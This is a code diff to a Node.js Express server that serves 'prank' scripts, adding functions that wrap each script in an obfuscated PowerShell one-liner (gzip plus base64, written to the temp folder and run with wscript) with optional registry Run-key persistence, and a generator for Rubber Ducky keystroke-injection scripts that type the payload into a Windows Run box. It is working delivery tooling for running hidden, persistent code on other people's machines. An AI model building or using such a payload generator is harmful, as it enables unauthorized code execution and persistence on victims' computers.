@@ -2,6 +2,8 @@ const express = require('express');
 const fs = require('fs').promises;
 const path = require('path');
 const cors = require('cors');
+const zlib = require("zlib");
+const { Buffer } = require("buffer");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -11,6 +13,35 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
+
+function generatePowerShell(jsCode, options = {}) {
+    const delay = options.delay || 0;
+    const addToStartup = options.addToStartup || false;
+
+    const delayCode = delay > 0 ? `WScript.Sleep(${delay});\n` : "";
+    const fullJs = delayCode + jsCode;
+
+    const gzipped = zlib.gzipSync(fullJs);
+    const base64 = gzipped.toString("base64");
+
+    const baseScript = `$z='${base64}';$d=[IO.MemoryStream][Convert]::FromBase64String($z);$g=New-Object IO.Compression.GzipStream($d,[IO.Compression.CompressionMode]::Decompress);$s=New-Object IO.StreamReader($g);$j=$s.ReadToEnd();$f="$env:TEMP\\prank.js";sc $f $j;`;
+
+    const regPersistence = addToStartup
+        ? `New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "prank" -Value "wscript.exe //nologo $f";`
+        : "";
+
+    const executeScript = `wscript //nologo $f`;
+
+    return `${baseScript}${regPersistence}${executeScript}`;
+}
+
+function generateDuckyScript(payload) {
+    return `
+WINDOWS r
+DELAY 1000
+STRING ${payload}
+ENTER`;
+}
 
 app.get('/pranks', async (req, res) => {
     try {
@@ -79,47 +110,60 @@ app.get('/pranks', async (req, res) => {
 });
 
 app.get('/getPranks/:filename', async (req, res) => {
+
     try {
-        const filename = req.params.filename;
-        const filePath = path.join(PRANKS_DIR, filename);
+        const delay = parseInt(req.query.delay) || 0;
+        const addToStartup = req.query.addToStartup === 'true';
+
+        const { filename } = req.params;
         
-        // Security check - prevent directory traversal
-        if (!filePath.startsWith(PRANKS_DIR)) {
+        if (!filename || filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
             return res.status(400).json({
                 success: false,
                 error: 'Invalid filename'
             });
         }
-
+        
+        const filePath = path.join(PRANKS_DIR, filename);
+        
+        try {
+            await fs.access(filePath);
+        } catch {
+            return res.status(404).json({
+                success: false,
+                error: 'Prank file not found'
+            });
+        }
+        
         const code = await fs.readFile(filePath, 'utf8');
-        const stats = await fs.stat(filePath);
+        
+        const powershellCode = generatePowerShell(code, {
+            delay: delay,
+            addToStartup: addToStartup,
+        });
+
+        const duckyScript = generateDuckyScript(powershellCode);
 
         res.json({
             success: true,
             filename: filename,
+            powershell: powershellCode,
             code: code,
-            size: stats.size,
-            modified: stats.mtime,
-            type: getPrankType(filename)
+            duckyScript: duckyScript,
         });
     } catch (error) {
-        if (error.code === 'ENOENT') {
-            res.status(404).json({
-                success: false,
-                error: 'Prank not found'
-            });
-        } else {
-            console.error('Error reading prank file:', error);
-            res.status(500).json({
-                success: false,
-                error: 'Failed to read prank file',
-                message: error.message
-            });
-        }
+        console.error('Error reading prank file:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to read prank file',
+            message: error.message
+        });
     }
 });
 
 app.get('/api/download/:filename', async (req, res) => {
+
+
 });
 
 
@@ -141,5 +185,7 @@ app.listen(PORT, () => {
 });
 
 module.exports = app;
+
+
 
 
